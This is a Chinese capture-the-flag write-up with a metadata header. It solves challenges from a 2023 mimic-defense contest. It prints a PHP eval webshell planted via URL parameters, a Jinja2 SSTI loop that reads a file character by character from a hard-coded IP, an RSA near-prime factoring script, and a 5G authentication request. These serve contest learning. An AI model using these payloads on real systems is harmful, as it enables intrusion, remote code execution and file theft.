---
title: 第六届"强网"拟态防御国际精英挑战赛 WriteUp By Mini-Venom
contest: 强网拟态防御
year: 2023
difficulty: medium
vuln_type: web_unknown
tags:
- Web-PHP-remove_path
- minihttpd命令注入
- Crypto-RSA-next_prime爆破
- Misc-二维码国际象棋
- Mimic-SSTI盲注
- 5G-AKA鉴权
attack_chain: 'Web-noumisotuitennnoka: minihttpd remove_path特性+create/zip/unzip/clear 4个action,创建/aa子目录+php webshell内容+zip+unzip到/var/www/html+clear删除.htaccess|一眼看出: 给n, c, a(近p,q)→for r in 0..2^6: p=next_prime(a-r), q=next_prime(next_prime(a)+r), if p*q==n: invert+pow|国际象棋与二维码: 500x500 49格棋盘图案 XOR attach.png → 二维码|用户登记系统: SSTI盲注 {{c.__init__.__globals__.__builtins__.open("".join(c.__init__.__globals__["__builtins__"].reversed("galf/pmt/"))).read()[i]}} for i in range(1000)字符逐位|用户鉴权: 5G核心网nudm-ueau/v1/suci-0-460-00-0-0-0-0123456001/security-information/generate-auth-data POST servingNetworkName=admin ausfInstanceId=admin → base64解码'
key_payload: '?action=create&subdir=/aa&content=<?php eval($_POST[aaa]);&dev=/tmp//|for r in range(0,2**6): p = gmpy2.next_prime(a-r); q = gmpy2.next_prime(gmpy2.next_prime(a)+r); if(p*q==n): d=gmpy2.invert(65537,(p-1)*(q-1)); m=pow(c,d,n); print(long_to_bytes(m)); break|棋盘 500x500 49格 XOR attach.png|reversed("galf/pmt/")|POST /nudm-ueau/v1/suci-0-460-00-0-0-0-0123456001/security-information/generate-auth-data {servingNetworkName:admin, ausfInstanceId:admin}|flag{621f7c4f-21de-8566-649e-5a883ce318dc}'
one_liner: 第六届强网拟态防御ChaMd5 Mini-Venom WP,4题:Web(minihttpd remove_path+create/zip/unzip/clear)+Crypto(RSA next_prime近p爆破)+Misc(国际象棋棋盘+二维码XOR)+Mimic(SSTI字符逐位盲注+5G-AKA鉴权)
lesson: '1) minihttpd remove_path路径处理:create/zip/unzip/clear四种action加subdir+content+dev(/tmp//); 2) RSA近p爆破:已知近似a,for r in 0..2^6: p=next_prime(a-r),q=next_prime(next_prime(a)+r)验证p*q==n; 3) 棋盘+二维码XOR:生成500x500 49格棋盘图像与attach.png按位XOR得二维码; 4) SSTI字符逐位盲注:`{{c.__init__.__globals__.__builtins__.open("".join(reversed("galf/pmt/"))).read()[i]}}` 1000次循环逐字符读; 5) 5G-AKA鉴权:POST nudm-ueau/v1/suci-0-460-00-0-0-0-0123456001/security-information/generate-auth-data Body JSON servingNetworkName+ausfInstanceId'
quality: medium
full_path: 第六届“强网”拟态防御国际精英挑战赛_WriteUp_By_Mini-Venom.full.md
meta_path: 第六届“强网”拟态防御国际精英挑战赛_WriteUp_By_Mini-Venom.meta.md
images_removed: true
images_removed_count: 4
schema_version: v3.0.0-P0
summary: 第六届"强网"拟态防御国际精英挑战赛 WriteUp By Mini-Venom。第六届强网拟态防御ChaMd5 Mini-Venom WP,4题:Web(minihttpd remove_path+create/zip/unzip/clear)+Crypto(RSA next_prime近p爆破)+Misc(国际象棋棋盘+二维码XOR)+Mimic(SSTI字符逐位盲注+5G-AKA鉴...
category: web
subcategory: web_other
tools_used:
- PHP
- gmpy2
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 4
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/146224.html
reasoning_chain:
- 触发点：noumisotuitennnoka 题目 Web 提示 remove_path → 假设：minihttpd 路径解析漏洞
- 动作：参考 tyage.net 博客利用 remove_path → 观察：action=create/zip/unzip/clear 可控
- 假设：create 写 .htaccess → 动作：写 SetHandler application/x-httpd-php 到 /tmp//
- 观察：访问 shell 触发 PHP 解析 → 下一步：上传 webshell
- Crypto 一眼看出：触发点：RSA n 大 c 大 → 假设：next_prime 关系 p = next_prime(a-r) q = next_prime(a)+r
- 动作：枚举 r ∈ [0, 2^6) 验证 p*q==n → 观察：解得 m
- 国际象棋二维码：触发点：49 格棋盘图 → 假设：与 attach.png 异或得到二维码
- Mimic SSTI 盲注：触发点：用户登记系统 /index.php name=SSTI 模板 → 假设：Jinja2 SSTI 字符翻转
failed_attempts:
- Web 直接 ?action=create 不带 subdir → 失败：未指定目录
- RSA 直接分解 n → 失败：n 太长无法直接分解
- SSTI 直接 {{config}} → 失败：黑名单过滤
key_observations:
- minihttpd remove_path 漏洞：URL 中含 ? 后路径分隔处理不当
- RSA next_prime 关系爆破：r 维度小可枚举
- 49 格棋盘与 attach.png 异或 = 二维码还原
- SSTI 字符串翻转绕过：''.join(reversed('galf/pmt/')) = '/tmp/flag'
prerequisites:
- minihttpd/lighttpd 历史漏洞
- RSA next_prime 攻击
- Jinja2 SSTI 盲注字符绕过
---
# 第六届“强网”拟态防御国际精英挑战赛 WriteUp By Mini-Venom

> 原文: https://www.ctfiot.com/146224.html
> ID: 146224

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组

Web:

noumisotuitennnoka

可以看下这个

https://blog.tyage.net/archive/p944.html 利用remove_path的问题

创建
?action=create&subdir=/aa&content=<?php eval($_POST[aaa]);&dev=/tmp//
压缩
?action=zip&subdir=/aa&content=<?php eval($_POST[aaa]);&dev=/tmp//
解压
?action=unzip&subdir=/aa&content=<?php eval($_POST[aaa]);&dev=/tmp//
删除.htaccess
?action=clear&subdir=/.htaccess&content=<?php eval($_POST[1]);&dev=/tmp//
访问shell

Crypto:

一眼看出

爆破解rsa

from Crypto.Util.number import *
import gmpy2
n=12102729894834999567967798241264854440333317726097524556907398306153858105
8440163574922807151182889153495253964764966037308461724272151584478723275142
8580082612577098179633300113762662611197672949490883976713601233211494147009
8103551729980712662575804610084066708133243496877086273107369397660406159757
5813313
c=42256117129723577554705402387775886393426604555611637074394963219097781224
7760580090035215659441802410321003294567023107373693818900413363120840919958
6556040268140377575101285643620793877161117759260042356367121765690839290171
3661029126149486651409531213711103407037959788587839729511719756709763927616
470267
a = 11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699

for r in range(0,2**6):

p = gmpy2.next_prime(a – r)

q = gmpy2.next_prime(gmpy2.next_prime(a) + r)

if(p*q==n):

d=gmpy2.invert(65537,(p-1)*(q-1))

m=pow(c,d,n)

print(long_to_bytes(m))

break

#flag{621f7c4f-21de-8566-649e-5a883ce318dc}

Misc:

国际象棋与二维码

生成500*500像素，行列为49格的棋盘图案
接着与attach.png异或得到二维码
扫描得到flag

Mimic:

用户登记系统

url = 'http://116.63.134.105/index.php'
for i in range(1000):
    paylaod = {'name':'{{c.__init__.__globals__.__builtins__.open("".join(c.__init__.__globals__["__builtins__"].reversed("galf/pmt/"))).read()['+str(i)+']}}'}
    response = requests.post(url,data=paylaod).text[8]
    print(response,end='')

用户鉴权

https://www.sharetechnote.com/html/5G/5G_Core_Authentication.html

POST /nudm-ueau/v1/suci-0-460-00-0-0-0-0123456001/security-information/generate-auth-data HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json

{

“servingNetworkName”: “admin”,

“ausfInstanceId”: “admin”

}

然后base64直接解密

– END –


```
创建
?action=create&subdir=/aa&content=<?php eval($_POST[aaa]);&dev=/tmp//
压缩
?action=zip&subdir=/aa&content=<?php eval($_POST[aaa]);&dev=/tmp//
解压
?action=unzip&subdir=/aa&content=<?php eval($_POST[aaa]);&dev=/tmp//
删除.htaccess
?action=clear&subdir=/.htaccess&content=<?php eval($_POST[1]);&dev=/tmp//
访问shell
from Crypto.Util.number import *
import gmpy2
n=12102729894834999567967798241264854440333317726097524556907398306153858105
8440163574922807151182889153495253964764966037308461724272151584478723275142
8580082612577098179633300113762662611197672949490883976713601233211494147009
8103551729980712662575804610084066708133243496877086273107369397660406159757
5813313
c=42256117129723577554705402387775886393426604555611637074394963219097781224
7760580090035215659441802410321003294567023107373693818900413363120840919958
6556040268140377575101285643620793877161117759260042356367121765690839290171
3661029126149486651409531213711103407037959788587839729511719756709763927616
470267
a = 11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699
生成500*500像素，行列为49格的棋盘图案
接着与attach.png异或得到二维码
扫描得到flag
url = 'http://116.63.134.105/index.php'
for i in range(1000):
    paylaod = {'name':'{{c.__init__.__globals__.__builtins__.open("".join(c.__init__.__globals__["__builtins__"].reversed("galf/pmt/"))).read()['+str(i)+']}}'}
    response = requests.post(url,data=paylaod).text[8]
    print(response,end='')
POST /nudm-ueau/v1/suci-0-460-00-0-0-0-0123456001/security-information/generate-auth-data HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]